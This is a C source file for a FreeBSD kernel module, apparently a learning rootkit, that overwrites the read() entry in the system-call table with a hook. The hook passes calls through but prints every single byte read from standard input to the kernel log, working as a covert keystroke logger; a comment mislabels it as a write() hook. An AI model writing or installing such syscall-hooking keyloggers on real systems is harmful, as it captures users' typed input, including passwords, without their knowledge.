// #include <sys/proc.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>

/*
    Hook function for write() syscall.
*/
static int read_hook(struct thread *td, void *args)
{
    struct read_args *uap = (struct read_args *) args;

    // kernel space stuff
    char buf[1];
    int done = 0;

    // call original write
    int error = sys_read(td, args);

    if (error || uap->nbyte != 1 || uap->fd != 0){
        return error;
    }

    copyinstr(uap->buf, buf, 1, &done);
    printf("[DEBUG]: %c\n", buf[0]);

    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
            break;
        case MOD_UNLOAD:
            sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "read_hook",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(read_rk, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
